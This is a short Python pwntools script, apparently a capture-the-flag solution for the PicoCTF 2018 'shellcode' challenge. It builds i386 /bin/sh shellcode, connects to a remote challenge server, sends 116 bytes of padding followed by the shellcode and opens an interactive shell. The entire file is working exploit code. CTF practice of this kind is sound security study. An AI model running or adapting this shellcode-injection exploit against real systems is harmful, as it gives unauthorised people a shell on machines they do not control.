#coding:utf-8
from pwn import *
import pwnlib
context.arch = 'i386'
context.log_level = 'debug'
shellcode = asm(shellcraft.sh())
sh = process("./PicoCTF_2018_shellcode")
sh = remote("node3.buuoj.cn",27148)
payload = 'a' * 116 +shellcode
sh.sendline(payload)
sh.interactive()